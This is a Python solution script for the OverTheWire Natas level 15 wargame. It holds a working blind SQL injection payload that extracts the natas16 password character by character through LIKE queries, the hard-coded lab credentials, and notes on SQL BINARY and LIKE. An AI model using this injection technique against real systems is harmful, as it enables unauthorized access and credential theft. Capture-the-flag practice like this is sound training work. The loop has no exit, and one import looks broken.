#!/usr/bin/env python3
'''
Level 15 → Level 16
BLIND SQL Injection
github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas15.py
www.youtube.com/watch?v=14eE7LSHlKc&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=13
Understanding Blind SQL Injection


Username: natas15
URL:      http://natas15.natas.labs.overthewire.org
password:   AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J


write up:



Manual Mode
https://www.jonyschats.nl/writeups/overthewire/natas/natas15/

'''
import string

import requests
import re
from string import *

from pyodbc import lowercase


username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

url = 'http://%s.natas.labs.overthewire.org/' % username

#characters = lowercase + uppercase + digits
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
print(characters)
session = requests.Session()

''' 
response = session.get(url, auth = (username, password) )
content = response.text
print (content) 
'''
#We are looking for natas16 user password so let try to
# send natas16 as user name
# The answer to the next command is:
# <div id="content"> This user exists.<br>
response = session.post(url, data = { "username" : "natas16"   },auth = (username, password) )

content = response.text
print (content)
seen_password = list('')

while ( True ):
  for ch in characters:
    print ("trying with password", "".join(seen_password) + ch)
    response = session.post(url,
        data = {
               "username" : 'natas16" AND BINARY password LIKE "' +
               "".join(seen_password) + ch + '%" # ' },
        auth = (username, password) )

    content = response.text
    if ( 'user exists' in content ):
            seen_password.append(ch)
            break


'''
SELECT BINARY "HELLO" = "hello"; 
SQL performs a byte-by-byte comparison of  "HELLO" and "hello" and 
return 0 (because on a byte-by-byte basis, they are NOT equivalent)


WHERE CustomerName LIKE 'a%' 	Finds any values that start with "a"
  '%a' 	 end with "a"
  '%or%' 	  have "or" in any position
  '_r%' 	  "r" in the second position
  'a_%' 	  start with "a" and are at least 2 characters in length
  'a__%' 	  "a" and are at least 3 characters in length
  'a%o' 	 start with "a" and ends with "o"


'''